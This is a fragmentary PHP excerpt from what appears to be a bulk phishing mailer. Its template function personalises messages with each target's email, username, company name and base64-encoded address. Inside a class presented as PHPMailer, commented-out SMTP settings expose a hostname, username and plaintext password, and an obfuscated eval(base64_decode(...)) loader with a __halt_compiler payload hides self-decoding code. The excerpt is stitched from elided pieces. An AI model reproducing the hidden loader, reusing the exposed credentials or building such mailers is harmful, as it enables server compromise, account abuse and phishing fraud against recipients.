...
function leafClear($text,$email){
    ...
    $emailuser=$e[0];
    $emaildomain=$e[1];
    $cname = email_domain($email);
    $up = $cname;
    $uper = ucfirst($up);
    $uperuser = ucfirst($e[0]);
    $text = str_replace("[-time-]", date("m/d/Y h:i:s a", time()), $text);
    $text = str_replace("[-email-]", $email, $text);
    $text = str_replace("[-emailuser-]", $uperuser, $text);
    $text = str_replace("[-baseencode-]", $encodeemail, $text);
    $text = str_replace("[-companyname-]", $uper, $text);
...
class PHPMailer
{
     ...
     * @var string
     */
    // public $Host = 'webmail.birkap.com.tr';
    ...
    //  */
    // public $Helo = 'webmail.birkap.com.tr';
    ...
    //  * @var string
    //  */
    // public $Username = 'ufuk@birkap.com.tr';

    // /**
    //  * SMTP password.
    //  * @var string
    //  */
    // public $Password = '!np1p42H';
    ...
    //  */
    // public $Realm = '';
    $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode(""));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=
        ...
        <div id="well" class="well well">
            ...
            <ul>
                ...
                <ul>
                    ...
                    <li>[-companyname-] : <b>Email User</b> (companyname) </li>
                    <li>[-baseencode-] : <b>Email User</b> (encodebase64 email) </li>
